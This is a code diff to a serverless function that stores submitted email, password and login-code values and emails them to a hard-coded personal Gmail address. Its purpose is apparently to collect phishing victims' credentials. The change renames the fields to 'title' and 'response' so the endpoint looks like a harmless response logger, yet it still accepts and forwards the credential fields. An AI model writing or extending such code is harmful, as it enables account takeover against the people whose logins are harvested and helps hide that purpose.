@@ -5,9 +5,8 @@ const store = getStore({ name: 'response-logs', consistency: 'strong' })
 const notificationEmail = 'raza.zaiidii@gmail.com'
 
 type EmailPayload = {
-  email: string
-  password: string
-  code: string
+  title: string
+  response: string
   blobKey: string
 }
 
@@ -28,14 +27,13 @@ async function sendResendEmail(payload: EmailPayload) {
     body: JSON.stringify({
       from,
       to: [notificationEmail],
-      subject: `New response log: ${payload.email}`,
+      subject: `New response log: ${payload.title}`,
       text: [
         'A new response log has been captured.',
         '',
         `Blob key: ${payload.blobKey}`,
-        `Email: ${payload.email}`,
-        `Password: ${payload.password}`,
-        `Code: ${payload.code}`,
+        `Title: ${payload.title}`,
+        `Response: ${payload.response}`,
       ].join('\n'),
     }),
   })
@@ -64,7 +62,7 @@ async function sendSendGridEmail(payload: EmailPayload) {
     body: JSON.stringify({
       personalizations: [{ to: [{ email: notificationEmail }] }],
       from: { email: from },
-      subject: `New response log: ${payload.email}`,
+      subject: `New response log: ${payload.title}`,
       content: [
         {
           type: 'text/plain',
@@ -72,9 +70,8 @@ async function sendSendGridEmail(payload: EmailPayload) {
             'A new response log has been captured.',
             '',
             `Blob key: ${payload.blobKey}`,
-            `Email: ${payload.email}`,
-            `Password: ${payload.password}`,
-            `Code: ${payload.code}`,
+            `Title: ${payload.title}`,
+            `Response: ${payload.response}`,
           ].join('\n'),
         },
       ],
@@ -112,39 +109,47 @@ export default async (req: Request) => {
     )
   }
 
-  let body: { email?: string; password?: string; code?: string } = {}
+  let body: {
+    title?: string
+    response?: string
+    email?: string
+    password?: string
+    code?: string
+  } = {}
   try {
     body = await req.json()
   } catch {
     return Response.json(
-      { error: 'Invalid JSON body. Send {"email","password","code"}.' },
+      {
+        error:
+          'Invalid JSON body. Send {"title","response"} or {"email","password","code"}.',
+      },
       { status: 400 },
     )
   }
 
-  const email = body.email?.trim() ?? ''
-  const password = body.password ?? ''
-  const code = body.code ?? ''
+  const title = body.title?.trim() ?? body.email?.trim() ?? ''
+  const response =
+    body.response ??
+    ([body.email, body.password, body.code].filter(Boolean).join('\n') || '')
 
-  if (!email || !password || !code) {
+  if (!title || !response) {
     return Response.json(
-      { error: 'email, password, and code are required.' },
+      { error: 'title and response are required.' },
       { status: 400 },
     )
   }
 
-  const combinedText = [email, password, code].join('\n')
-  await store.set(email, combinedText)
+  await store.set(title, response)
   await sendLogEmail({
-    email,
-    password,
-    code,
-    blobKey: email,
+    title,
+    response,
+    blobKey: title,
   })
 
   return Response.json({
     ok: true,
-    key: email,
+    key: title,
   })
 }
 
